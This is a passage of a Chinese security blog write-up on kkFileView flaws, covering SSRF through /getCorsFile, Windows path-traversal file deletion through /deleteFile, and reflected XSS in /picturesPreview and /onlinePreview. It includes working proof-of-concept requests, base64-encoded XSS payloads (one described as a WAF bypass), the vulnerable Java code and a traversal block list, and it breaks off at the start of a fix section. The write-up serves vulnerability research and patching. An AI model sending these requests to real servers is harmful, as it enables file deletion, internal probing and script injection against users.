<h2 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h2><blockquote>
<p>kkFileView &lt;&#x3D; v3.6.0, &lt;&#x3D; v4.4.0-beta</p>
</blockquote>
<h3 id="复现-2"><a href="#复现-2" class="headerlink" title="复现"></a>复现</h3><p>kkFileView &lt;&#x3D; 3.6.0, &lt;&#x3D; 4.0.0</p>
<p><img src="https://s2.loli.net/2024/12/20/RzyKhpMPOLJoIk1.png" alt="img"></p>
<p><img src="https://s2.loli.net/2024/12/20/PEv4Ciq2JsXMAO8.png" alt="img"></p>
<p>4.1.0 &lt;&#x3D; kkFileView &lt;&#x3D; 4.4.0-beta</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/getCorsFile?urlPath=aHR0cHM6Ly93d3cuYmFpZHUuY29tLw==</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2024/12/20/QH9qM6DwcRmFEpT.png" alt="img"></p>
<h3 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h3><p>根据上面的分析也很容易理解为什么存在SSRF，4.1.0在修复任意文件读取漏洞的时候只对file协议做了一定过滤，而HTTP协议和HTTPS协议并未受影响</p>
<h3 id="修复-2"><a href="#修复-2" class="headerlink" title="修复"></a>修复</h3><p>经过尝试4.4.0-beta也是能SSRF的，</p>
<p><img src="https://s2.loli.net/2024/12/20/hjw7UAVpCSGFMPv.png" alt="img"></p>
<p><img src="https://s2.loli.net/2024/12/20/uF7Dk6yMAL8xtmH.png" alt="img"></p>
<p>但是官方给的预览网站无法成功，估计是某个配置项可以配置</p>
<p><a target="_blank" rel="noopener" href="https://github.com/kekingcn/kkFileView/issues/392">https://github.com/kekingcn/kkFileView/issues/392</a></p>
<p><img src="https://s2.loli.net/2024/12/20/3FyzfNmwGrApj9E.png" alt="img"></p>
<p>比如这个可以限制允许预览的本地文件夹</p>
<p><a target="_blank" rel="noopener" href="https://github.com/kekingcn/kkFileView/pull/309/commits/9d65c999e5e7a98f9e68f76757977fefa13b72ac">https://github.com/kekingcn/kkFileView/pull/309/commits/9d65c999e5e7a98f9e68f76757977fefa13b72ac</a></p>
<h2 id="任意文件删除"><a href="#任意文件删除" class="headerlink" title="任意文件删除"></a>任意文件删除</h2><blockquote>
<p>kkFileView &#x3D;&#x3D; v4.0.0 （仅在windows环境下成功）</p>
</blockquote>
<h3 id="复现-3"><a href="#复现-3" class="headerlink" title="复现"></a>复现</h3><p>创建一个目录用于存放上传的文件，并在配置项中指定这个目录</p>
<p><img src="https://s2.loli.net/2024/12/20/TuNDGXCaPr4ytbo.png" alt="img"></p>
<p>创建在目录下创建一个poc.txt用于检验目录成功穿越（正常只能删除demo目录下的文件）</p>
<p><img src="https://s2.loli.net/2024/12/20/4sJgYut5wyc1RND.png" alt="img"></p>
<p>然后GET请求<code>/deleteFile?fileName=demo%2F..\poc.txt</code></p>
<p><img src="https://s2.loli.net/2024/12/20/xX7LfzhwSmUbiuq.png" alt="img"></p>
<p><img src="https://s2.loli.net/2024/12/20/j4x9DkpeagzWhKr.png" alt="img"></p>
<p>可以看到文件成功被删除</p>
<h3 id="分析-3"><a href="#分析-3" class="headerlink" title="分析"></a>分析</h3><p>非常简单的锁定路由</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(value = &quot;deleteFile&quot;, method = RequestMethod.GET)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">deleteFile</span><span class="params">(String fileName)</span> <span class="keyword">throws</span> JsonProcessingException &#123;</span><br><span class="line">    <span class="keyword">if</span> (fileName.contains(<span class="string">&quot;/&quot;</span>)) &#123;</span><br><span class="line">        fileName = fileName.substring(fileName.lastIndexOf(<span class="string">&quot;/&quot;</span>) + <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(fileDir + demoPath + fileName);</span><br><span class="line">    logger.info(<span class="string">&quot;删除文件：&#123;&#125;&quot;</span>, file.getAbsolutePath());</span><br><span class="line">    <span class="keyword">if</span> (file.exists() &amp;&amp; !file.delete()) &#123;</span><br><span class="line">        logger.error(<span class="string">&quot;删除文件【&#123;&#125;】失败，请检查目录权限！&quot;</span>,file.getPath());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ObjectMapper</span>().writeValueAsString(ReturnResponse.success());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到首先会对传入的fileName参数进行处理，只保留最后一个<code>/</code>后的内容，但Windows支持<code>\</code>路径分隔符，于是可以利用<code>..\</code>目录穿越，从而达到任意文件删除的危害</p>
<p><img src="https://s2.loli.net/2024/12/20/UAMcmLS3gHYPyvs.png" alt="img"></p>
<h3 id="修复-3"><a href="#修复-3" class="headerlink" title="修复"></a>修复</h3><p>在v4.1.0的代码中加入了黑名单过滤</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;/deleteFile&quot;)</span></span><br><span class="line"><span class="keyword">public</span> ReturnResponse&lt;Object&gt; <span class="title function_">deleteFile</span><span class="params">(String fileName)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (fileName == <span class="literal">null</span> || fileName.length() == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> ReturnResponse.failure(<span class="string">&quot;文件名为空，删除失败！&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        fileName = URLDecoder.decode(fileName, StandardCharsets.UTF_8.name());</span><br><span class="line">    &#125; <span class="keyword">catch</span> (UnsupportedEncodingException e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (fileName.contains(<span class="string">&quot;/&quot;</span>)) &#123;</span><br><span class="line">        fileName = fileName.substring(fileName.lastIndexOf(<span class="string">&quot;/&quot;</span>) + <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (KkFileUtils.isIllegalFileName(fileName)) &#123;</span><br><span class="line">        <span class="keyword">return</span> ReturnResponse.failure(<span class="string">&quot;非法文件名，删除失败！&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(fileDir + demoPath + fileName);</span><br><span class="line">    logger.info(<span class="string">&quot;删除文件：&#123;&#125;&quot;</span>, file.getAbsolutePath());</span><br><span class="line">    <span class="keyword">if</span> (file.exists() &amp;&amp; !file.delete()) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">msg</span> <span class="operator">=</span> String.format(<span class="string">&quot;删除文件【%s】失败，请检查目录权限！&quot;</span>, file.getPath());</span><br><span class="line">        logger.error(msg);</span><br><span class="line">        <span class="keyword">return</span> ReturnResponse.failure(msg);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ReturnResponse.success();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> List&lt;String&gt; illegalFileStrList = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> &#123;</span><br><span class="line">    illegalFileStrList.add(<span class="string">&quot;../&quot;</span>);</span><br><span class="line">    illegalFileStrList.add(<span class="string">&quot;./&quot;</span>);</span><br><span class="line">    illegalFileStrList.add(<span class="string">&quot;..\\&quot;</span>);</span><br><span class="line">    illegalFileStrList.add(<span class="string">&quot;.\\&quot;</span>);</span><br><span class="line">    illegalFileStrList.add(<span class="string">&quot;\\..&quot;</span>);</span><br><span class="line">    illegalFileStrList.add(<span class="string">&quot;\\.&quot;</span>);</span><br><span class="line">    illegalFileStrList.add(<span class="string">&quot;..&quot;</span>);</span><br><span class="line">    illegalFileStrList.add(<span class="string">&quot;...&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 省略中间的代码</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 检查文件名是否合规</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> fileName 文件名</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> 合规结果,true:不合规，false:合规</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">isIllegalFileName</span><span class="params">(String fileName)</span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (String str: illegalFileStrList)&#123;</span><br><span class="line">        <span class="keyword">if</span>(fileName.contains(str))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>过滤的还是非常严格的，直接给堵死了</p>
<h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2><blockquote>
<p>&#x2F;picturesPreview                              kkFileView &lt;&#x3D; 4.1.0</p>
<p>&#x2F;onlinePreview                                 kkFileView &lt;&#x3D; 4.1.0</p>
</blockquote>
<h3 id="复现-4"><a href="#复现-4" class="headerlink" title="复现"></a>复现</h3><p>第一处</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/picturesPreview?urls=aHR0cDovL3d3dy5iYWlkdS5jb20vdGVzdC50eHQiPjxpbWcgc3JjPTExMSBvbmVycm9yPWFsZXJ0KDEpPg%3D%3D</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2024/12/20/tJDaq87XCKmkZNd.png" alt="img"></p>
<p>第二处</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/picturesPreview?urls=&amp;currentUrl=Iik7YWxlcnQoIjExMQ==</span><br></pre></td></tr></table></figure>

<p>2024.09.04 今天绕过了个WAF，记录一下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/picturesPreview?urls=&amp;currentUrl=PC9wPjwvc3Bhbj48L3N0eWxlICYjMzI7PjxzY3JpcHQgJiMzMjsgOi0oPi8qKi9hbGVydCg3NzYpLyoqLzwvc2NyaXB0ICYjMzI7IDotKDxzcGFuPjxwPg%3d%3d</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2024/12/20/Oj5eMQEs3gaChdY.png" alt="img"></p>
<p>第三处</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/onlinePreview?url=aHR0cDovLyI%2BPHN2Zy9vbmxvYWQ9IndpbmRvdy5vbmVycm9yPWV2YWw7dGhyb3cnPWFsZXJ0XHgyODFceDI5JzsiPi90ZXN0LnBuZw%3D%3D</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2024/12/20/VPeiFf6HQAGuyT3.png" alt="img"></p>
<h3 id="分析-4"><a href="#分析-4" class="headerlink" title="分析"></a>分析</h3><p>&#x2F;picturesPreview</p>
<p>可以看到这里将传入的urls进行base64解码后添加到了model中</p>
<p><img src="https://s2.loli.net/2024/12/20/xNyQrwgtOchqdX4.png" alt="img"></p>
<p>而全局用了freemarker模板渲染，未经处理直接拼接到了html中</p>
<p><img src="https://s2.loli.net/2024/12/20/Ray8LiSOh3dnxFj.png" alt="img"></p>
<p>很明显存在XSS缺陷。currentUrl也是类似这样，可以拼接像<code>&quot;);alert(&quot;111</code>一样闭合，从而执行任意js代码</p>
<p><img src="https://s2.loli.net/2024/12/20/bzTcAw8JLV1Dptd.png" alt="img"></p>
<p>&#x2F;onlinePreview</p>
<p>这个稍微复杂一点，没那么明显</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping( &quot;/onlinePreview&quot;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">onlinePreview</span><span class="params">(String url, Model model, HttpServletRequest req)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (url == <span class="literal">null</span> || url.length() == <span class="number">0</span>)&#123;</span><br><span class="line">        logger.info(<span class="string">&quot;URL异常：&#123;&#125;&quot;</span>, url);</span><br><span class="line">        <span class="keyword">return</span> otherFilePreview.notSupportedFile(model, <span class="string">&quot;NULL地址不允许预览&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    String fileUrl;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        fileUrl = WebUtils.decodeUrl(url);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception ex) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">errorMsg</span> <span class="operator">=</span> String.format(BASE64_DECODE_ERROR_MSG, <span class="string">&quot;url&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> otherFilePreview.notSupportedFile(model, errorMsg);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">FileAttribute</span> <span class="variable">fileAttribute</span> <span class="operator">=</span> fileHandlerService.getFileAttribute(fileUrl, req);</span><br><span class="line">    model.addAttribute(<span class="string">&quot;file&quot;</span>, fileAttribute);</span><br><span class="line">    <span class="type">FilePreview</span> <span class="variable">filePreview</span> <span class="operator">=</span> previewFactory.get(fileAttribute);</span><br><span class="line">    logger.info(<span class="string">&quot;预览文件url：&#123;&#125;，previewType：&#123;&#125;&quot;</span>, fileUrl, fileAttribute.getType());</span><br><span class="line">    <span class="keyword">return</span> filePreview.filePreviewHandle(fileUrl, model, fileAttribute);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>首先对传入的参数url进行Base64解码，然后跟进<code>cn.keking.service.FileHandlerService#getFileAttribute</code>方法，这里这个方法并不是漏洞点，只需要让传入的参数不会报错提前退出就行</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 获取文件属性</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> url url</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> 文件属性</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> FileAttribute <span class="title function_">getFileAttribute</span><span class="params">(String url, HttpServletRequest req)</span> &#123;</span><br><span class="line">    <span class="type">FileAttribute</span> <span class="variable">attribute</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileAttribute</span>();</span><br><span class="line">    String suffix;</span><br><span class="line">    FileType type;</span><br><span class="line">    String fileName;</span><br><span class="line">    <span class="type">String</span> <span class="variable">fullFileName</span> <span class="operator">=</span> WebUtils.getUrlParameterReg(url, <span class="string">&quot;fullfilename&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (StringUtils.hasText(fullFileName)) &#123;</span><br><span class="line">        fileName = fullFileName;</span><br><span class="line">        type = FileType.typeFromFileName(fullFileName);</span><br><span class="line">        suffix = KkFileUtils.suffixFromFileName(fullFileName);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        fileName = WebUtils.getFileNameFromURL(url);</span><br><span class="line">        type = FileType.typeFromUrl(url);</span><br><span class="line">        suffix = WebUtils.suffixFromUrl(url);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (url.contains(<span class="string">&quot;?fileKey=&quot;</span>)) &#123;</span><br><span class="line">        attribute.setSkipDownLoad(<span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    attribute.setType(type);</span><br><span class="line">    attribute.setName(fileName);</span><br><span class="line">    attribute.setSuffix(suffix);</span><br><span class="line">    url = WebUtils.encodeUrlFileName(url);</span><br><span class="line">    attribute.setUrl(url);</span><br><span class="line">    <span class="keyword">if</span> (req != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">officePreviewType</span> <span class="operator">=</span> req.getParameter(<span class="string">&quot;officePreviewType&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">fileKey</span> <span class="operator">=</span> WebUtils.getUrlParameterReg(url,<span class="string">&quot;fileKey&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (StringUtils.hasText(officePreviewType)) &#123;</span><br><span class="line">            attribute.setOfficePreviewType(officePreviewType);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (StringUtils.hasText(fileKey)) &#123;</span><br><span class="line">            attribute.setFileKey(fileKey);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">tifPreviewType</span> <span class="operator">=</span> req.getParameter(<span class="string">&quot;tifPreviewType&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (StringUtils.hasText(tifPreviewType)) &#123;</span><br><span class="line">            attribute.setTifPreviewType(tifPreviewType);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">filePassword</span> <span class="operator">=</span> req.getParameter(<span class="string">&quot;filePassword&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (StringUtils.hasText(filePassword)) &#123;</span><br><span class="line">            attribute.setFilePassword(filePassword);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">userToken</span> <span class="operator">=</span> req.getParameter(<span class="string">&quot;userToken&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (StringUtils.hasText(userToken)) &#123;</span><br><span class="line">            attribute.setUserToken(userToken);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> attribute;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里报错的主要影响因素在于<code>WebUtils.encodeUrlFileName</code>这个方法的处理，于是构造一个<code>http://xxxxxxx/test.png</code>即可</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 对url中的文件名进行UTF-8编码</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> url url</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> 文件名编码后的url</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">encodeUrlFileName</span><span class="params">(String url)</span> &#123;</span><br><span class="line">    String encodedFileName;</span><br><span class="line">    <span class="type">String</span> <span class="variable">fullFileName</span> <span class="operator">=</span> WebUtils.getUrlParameterReg(url, <span class="string">&quot;fullfilename&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (fullFileName != <span class="literal">null</span> &amp;&amp; fullFileName.length() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            encodedFileName = URLEncoder.encode(fullFileName, <span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (UnsupportedEncodingException e) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">String</span> <span class="variable">noQueryUrl</span> <span class="operator">=</span> url.substring(<span class="number">0</span>, url.indexOf(<span class="string">&quot;?&quot;</span>));</span><br><span class="line">        <span class="type">String</span> <span class="variable">parameterStr</span> <span class="operator">=</span> url.substring(url.indexOf(<span class="string">&quot;?&quot;</span>));</span><br><span class="line">        parameterStr = parameterStr.replaceFirst(fullFileName, encodedFileName);</span><br><span class="line">        <span class="keyword">return</span> noQueryUrl + parameterStr;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">String</span> <span class="variable">noQueryUrl</span> <span class="operator">=</span> url.substring(<span class="number">0</span>, url.contains(<span class="string">&quot;?&quot;</span>) ? url.indexOf(<span class="string">&quot;?&quot;</span>) : url.length());</span><br><span class="line">    <span class="type">int</span> <span class="variable">fileNameStartIndex</span> <span class="operator">=</span> noQueryUrl.lastIndexOf(<span class="string">&#x27;/&#x27;</span>) + <span class="number">1</span>;</span><br><span class="line">    <span class="type">int</span> <span class="variable">fileNameEndIndex</span> <span class="operator">=</span> noQueryUrl.lastIndexOf(<span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        encodedFileName = URLEncoder.encode(noQueryUrl.substring(fileNameStartIndex, fileNameEndIndex), <span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (UnsupportedEncodingException e) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> url.substring(<span class="number">0</span>, fileNameStartIndex) + encodedFileName + url.substring(fileNameEndIndex);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>回到主逻辑，<code>previewFactory.get(fileAttribute)</code>会获取得到的文件属性，并分配对应文件类型的预览处理器，这里的处理方式应该是工厂模式的设计思想</p>
<p>我们需要利用的预览处理和前面两处XSS漏洞一样，都是利用图片处理的模板，我们前面传入了形如<code>http://xxxxxxx/test.png</code>的值，于是可以让文件属性的类型为PICTURE</p>
<p><img src="https://s2.loli.net/2024/12/20/mNLzbsWpiOZ9Ene.png" alt="img"></p>
<p><img src="https://s2.loli.net/2024/12/20/brQ9d5pRqc2iGfJ.png" alt="img"></p>
<p>从而使得最后交由<code>cn.keking.service.impl.PictureFilePreviewImpl#filePreviewHandle</code>进行处理</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">filePreviewHandle</span><span class="params">(String url, Model model, FileAttribute fileAttribute)</span> &#123;</span><br><span class="line">    List&lt;String&gt; imgUrls = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">    imgUrls.add(url);</span><br><span class="line">    <span class="type">String</span> <span class="variable">fileKey</span> <span class="operator">=</span> fileAttribute.getFileKey();</span><br><span class="line">    List&lt;String&gt; zipImgUrls = fileHandlerService.getImgCache(fileKey);</span><br><span class="line">    <span class="keyword">if</span> (!CollectionUtils.isEmpty(zipImgUrls)) &#123;</span><br><span class="line">        imgUrls.addAll(zipImgUrls);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 不是http开头，浏览器不能直接访问，需下载到本地</span></span><br><span class="line">    <span class="keyword">if</span> (url != <span class="literal">null</span> &amp;&amp; !url.toLowerCase().startsWith(<span class="string">&quot;http&quot;</span>)) &#123;</span><br><span class="line">        ReturnResponse&lt;String&gt; response = DownloadUtils.downLoad(fileAttribute, <span class="literal">null</span>);</span><br><span class="line">        <span class="keyword">if</span> (response.isFailure()) &#123;</span><br><span class="line">            <span class="keyword">return</span> otherFilePreview.notSupportedFile(model, fileAttribute, response.getMsg());</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">file</span> <span class="operator">=</span> fileHandlerService.getRelativePath(response.getContent());</span><br><span class="line">            imgUrls.clear();</span><br><span class="line">            imgUrls.add(file);</span><br><span class="line">            model.addAttribute(<span class="string">&quot;imgUrls&quot;</span>, imgUrls);</span><br><span class="line">            model.addAttribute(<span class="string">&quot;currentUrl&quot;</span>, file);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        model.addAttribute(<span class="string">&quot;imgUrls&quot;</span>, imgUrls);</span><br><span class="line">        model.addAttribute(<span class="string">&quot;currentUrl&quot;</span>, url);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> PICTURE_FILE_PREVIEW_PAGE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里就和前面差不多了，传入得url值不经过滤或其他处理的直接传入了模板中，导致了XSS缺陷</p>
<h3 id="修复-4"><a href="#修复-4" class="headerlink" title="修复"></a>修复</h3><p>v4.2.0中修复后&#x2F;picturesPreview的代码为</p>
